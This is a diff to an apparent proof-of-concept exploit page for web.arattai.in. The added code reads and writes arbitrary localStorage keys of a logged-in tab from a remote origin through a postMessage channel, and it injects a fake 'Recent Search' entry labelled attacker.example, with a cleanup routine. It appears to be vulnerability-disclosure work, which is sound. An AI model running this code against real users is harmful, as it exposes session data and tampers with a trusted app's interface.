@@ -45,6 +45,32 @@
   <button id="btnClear">Clear log</button>
 </div>
 
+<div class="row" style="border-top:1px solid #ddd; padding-top:10px;">
+  <label style="width:100%"><strong>Cross-visibility test</strong> — use this to check whether the PoC's
+    storage bucket is the SAME one the real logged-in tab uses, or an isolated (partitioned) one.
+    Set a key/value in the real <code>web.arattai.in</code> tab's own console, then try to read it here
+    with the same key name — or vice versa.</label>
+  <input id="customKey" type="text" placeholder="key name" style="flex:1;min-width:160px;">
+  <input id="customVal" type="text" placeholder="value (for write)" style="flex:1;min-width:160px;">
+  <button id="btnCustomRead" disabled>Read this key</button>
+  <button id="btnCustomWrite" disabled>Write this key</button>
+</div>
+
+<div class="row" style="border-top:1px solid #ddd; padding-top:10px;">
+  <label style="width:100%"><strong>Visible UI-injection PoC ("Recent Search" entry)</strong> — writes a
+    single fake entry into the <code>recent_searches</code> localStorage key. This key is deliberately
+    chosen because (a) it is read and rendered directly by the app's Global Search "Recent" list
+    (<code>GlobalSearch.vue</code>) and (b) it is <em>not</em> encryption/session material, so this is
+    safe to demo without corrupting your real session or E2EE keys. After clicking Inject, open/refresh
+    Global Search in the real, already-logged-in <code>web.arattai.in</code> tab and look for the
+    injected entry — if it appears, this is your screenshot, AND it proves the PoC's storage bucket is
+    the SAME one the real tab uses (no partitioning). If it never appears, the buckets are isolated —
+    re-run the cross-visibility test above to confirm.</label>
+  <input id="injectTitle" type="text" style="flex:1;min-width:260px;" value="⚠ INJECTED FROM REMOTE ORIGIN (attacker.example)">
+  <button id="btnInjectRecent" disabled>Inject fake Recent Search entry</button>
+  <button id="btnCleanupRecent" disabled>Remove injected entry (cleanup)</button>
+</div>
+
 <table>
   <thead><tr><th style="width:26%">Probe</th><th style="width:12%">Status</th><th>Detail</th></tr></thead>
   <tbody id="resultsBody">
@@ -115,6 +141,10 @@
         'gate on the receiver side (db-handler.js:15) — see log for raw event.');
       document.getElementById('btnEnumerate').disabled = false;
       document.getElementById('btnWriteProbe').disabled = false;
+      document.getElementById('btnCustomRead').disabled = false;
+      document.getElementById('btnCustomWrite').disabled = false;
+      document.getElementById('btnInjectRecent').disabled = false;
+      document.getElementById('btnCleanupRecent').disabled = false;
       return;
     }
 
@@ -203,6 +233,78 @@
 
   document.getElementById('btnClear').onclick = function () {
     document.getElementById('log').textContent = '';
+  };
+
+  document.getElementById('btnCustomRead').onclick = async function () {
+    var key = document.getElementById('customKey').value;
+    if (!key) { logLine('Enter a key name first.'); return; }
+    logLine('--- Cross-visibility READ: getItem("' + key + '") ---');
+    var resp = await requestLocalStorage('getItem', key, 'custom getItem(' + key + ')');
+    if (resp.timeout) {
+      logLine('CROSS-VISIBILITY RESULT: timeout — no response.');
+    } else if (resp.result === null || resp.result === undefined) {
+      logLine('CROSS-VISIBILITY RESULT: key "' + key + '" not found in the PoC\'s storage bucket. ' +
+        'If you know this key exists in the REAL tab (checked via its own console), this bucket is ' +
+        'ISOLATED/partitioned from the real tab\'s storage — the RPC is real but not reaching the ' +
+        'same storage the session actually uses in this browser.');
+    } else {
+      logLine('CROSS-VISIBILITY RESULT: VALUE FOUND -> ' + JSON.stringify(resp.result) +
+        '  — this bucket IS the same storage the real tab sees. Full session-data exposure confirmed.');
+    }
+  };
+
+  var RECENT_SEARCH_KEY = 'recent_searches';
+  var INJECT_ID_PREFIX = '__poc_injected_';
+  var injectId = INJECT_ID_PREFIX + Date.now() + '__';
+
+  document.getElementById('btnInjectRecent').onclick = async function () {
+    var title = document.getElementById('injectTitle').value || 'Injected via postMessage PoC';
+    logLine('--- UI-injection: reading current recent_searches to prepend (non-destructive) ---');
+    var readResp = await requestLocalStorage('getItem', RECENT_SEARCH_KEY, 'getItem(recent_searches)');
+    var list = [];
+    if (!readResp.timeout && !readResp.error && readResp.result) {
+      try { list = JSON.parse(readResp.result); if (!Array.isArray(list)) list = []; } catch (e) { list = []; }
+    }
+    var fakeEntry = { id: injectId, title: title, type: 'user' };
+    list.unshift(fakeEntry);
+    logLine('New recent_searches array (fake entry prepended):', list);
+    var writeResp = await requestLocalStorage('setItem', [RECENT_SEARCH_KEY, JSON.stringify(list)], 'setItem(recent_searches)');
+    if (writeResp.timeout) {
+      logLine('Injection write timed out — no confirmation.');
+    } else {
+      logLine('Injection write sent. Now go to the REAL web.arattai.in tab, open Global Search, and ' +
+        'check the "Recent" section for: "' + title + '". If it appears, take your screenshot now — ' +
+        'this proves an unrelated remote origin wrote data that the trusted app rendered in its own UI.');
+    }
+  };
+
+  document.getElementById('btnCleanupRecent').onclick = async function () {
+    logLine('--- Cleanup: removing any PoC-injected entries from recent_searches ---');
+    var readResp = await requestLocalStorage('getItem', RECENT_SEARCH_KEY, 'getItem(recent_searches) [cleanup]');
+    if (readResp.timeout || readResp.error || !readResp.result) {
+      logLine('Nothing to clean up (no existing value or timeout).');
+      return;
+    }
+    var list = [];
+    try { list = JSON.parse(readResp.result); if (!Array.isArray(list)) list = []; } catch (e) { list = []; }
+    var filtered = list.filter(function (item) {
+      return !(item && typeof item.id === 'string' && item.id.indexOf(INJECT_ID_PREFIX) === 0);
+    });
+    if (filtered.length === list.length) {
+      logLine('No PoC-injected entries found — nothing removed.');
+      return;
+    }
+    await requestLocalStorage('setItem', [RECENT_SEARCH_KEY, JSON.stringify(filtered)], 'setItem(recent_searches) [cleanup]');
+    logLine('Removed ' + (list.length - filtered.length) + ' injected entr(y/ies). Refresh Global Search in the real tab to confirm it is gone.');
+  };
+
+  document.getElementById('btnCustomWrite').onclick = async function () {
+    var key = document.getElementById('customKey').value;
+    var val = document.getElementById('customVal').value;
+    if (!key) { logLine('Enter a key name first.'); return; }
+    logLine('--- Cross-visibility WRITE: setItem("' + key + '", "' + val + '") ---');
+    await requestLocalStorage('setItem', [key, val], 'custom setItem(' + key + ')');
+    logLine('Write sent. Now check the REAL web.arattai.in tab console: localStorage.getItem("' + key + '")');
   };
 })();
 </script>
